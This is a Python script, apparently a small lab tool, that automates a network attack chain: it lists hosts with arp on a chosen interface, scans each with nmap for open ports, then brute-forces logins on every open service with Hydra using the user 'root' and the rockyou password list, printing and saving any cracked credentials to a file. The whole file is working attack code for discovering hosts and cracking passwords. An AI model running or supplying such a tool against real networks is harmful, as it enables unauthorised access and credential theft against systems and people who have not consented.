import subprocess
from dataclasses import dataclass

@dataclass
class Port:
    ip: str
    port: str
    service: str
    
@dataclass
class Login:
    ip: str
    port: str
    service: str
    user: str
    password: str

# Changeable options for running the script
network_interface = "docker0"
user_list = "root"
password_list = "/usr/share/wordlists/rockyou.txt"
hydra_speed = "8"


def arp_scan():
    """run an arp scan against the network
        return list of ips in the network
    """

    output = subprocess.check_output(["arp","-a","-i", network_interface]).splitlines()
    ip_results = []
    for line in output:
        ip_line = line.split(b" ")[1].decode("utf-8")[1:-1]
        ip_results.append(ip_line)

    return ip_results


def nmap_scan(ip):
    """run a nmap scan against each ip in the network
        return list of ips with ports open
    """
    
    ports = []
    output = subprocess.check_output(["nmap", ip]).splitlines()
    for line in output:
        if b"open" in line:
            port = line.split(b" ")[0].split(b"/")[0].decode("utf-8")
            service = line.split(b" ")[3].decode("utf-8")
            ports.append(Port(ip, port, service))                  
    return  ports


def hydra(ip, service, port):
    """run hydra against each open port
        return ip,port,service,user,password
    """

    output = subprocess.check_output(["hydra", "-s", port, "-t", hydra_speed, "-l", user_list, "-P", password_list, ip, service]).splitlines() 
    for line in output:
        login = []
        all_logins = []
        if b"host: " + bytes(ip, "utf-8") in line:
            user = line.split(b" ")[6].decode("utf-8")
            password = line.split(b" ")[10].decode("utf-8")
            login.append(Login(ip,port,service,user,password))
            all_logins.append(login)
            print("Login for " + service + " on port " + port + " in IP:" + ip + ":\nUser: " + user + " Password: " + password)  
            return all_logins

def add_to_pass_log(login):
    """create file
        return file with login information 
    """

    login_file = open("login.txt", "a")
    login_file.write(str(login) + "\n")
    login_file.close()
    return login_file


def main():
    for ip in arp_scan():
        ports = nmap_scan(ip)
        for port in ports:
            login = hydra(port.ip, port.service, port.port, )
            add_to_pass_log(login)
                                                                                                      

main()